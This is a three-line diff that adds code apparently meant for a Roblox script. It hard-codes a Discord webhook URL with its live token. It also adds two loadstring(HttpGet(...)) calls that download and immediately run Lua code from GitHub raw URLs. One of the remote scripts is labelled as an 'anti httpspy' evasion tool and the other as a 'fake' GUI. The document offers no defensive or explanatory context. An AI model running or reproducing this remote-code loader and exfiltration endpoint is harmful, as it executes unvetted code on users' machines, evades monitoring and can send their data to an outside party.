@@ -1,0 +1,3 @@
+WEBHOOK_URL = "https://discord.com/api/webhooks/1521062647787819018/aDoSm9kGUM0XtHe5AosYVl_-zdM_m8lLCVOty6KNyTi5aBK2wwgLBb1weLzgrxTcW3zd"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sikon789/Pyramid-Anti-httpspy/refs/heads/main/Pyramid%20Anti%20httpspy"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/lu_hub_gui_fake"))()
